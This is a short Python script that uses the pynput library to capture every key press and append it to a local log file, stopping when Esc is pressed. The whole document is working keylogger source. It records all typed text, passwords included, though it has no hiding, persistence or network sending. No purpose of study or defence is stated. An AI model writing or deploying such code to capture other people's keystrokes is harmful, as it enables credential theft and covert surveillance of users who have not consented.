from pynput.keyboard import Key, Listener

# Path to the log file
log_file = "keylog.txt"

# Function to write the key to the log file
def write_to_log(key):
    # Convert key to string
    key = str(key)

    # If key is a special key (e.g., Key.space, Key.enter), format it appropriately
    if key.find("Key") != -1:
        key = key.replace("Key.", " ")

    # Write the key to the log file
    with open(log_file, "a") as f:
        f.write(key)
        f.close()

# Function to handle key press events
def on_press(key):
    # Write the key to the log file
    write_to_log(key)

# Function to handle key release events
def on_release(key):
    # If the ESC key is pressed, stop the listener
    if key == Key.esc:
        return False

# Start the listener
with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
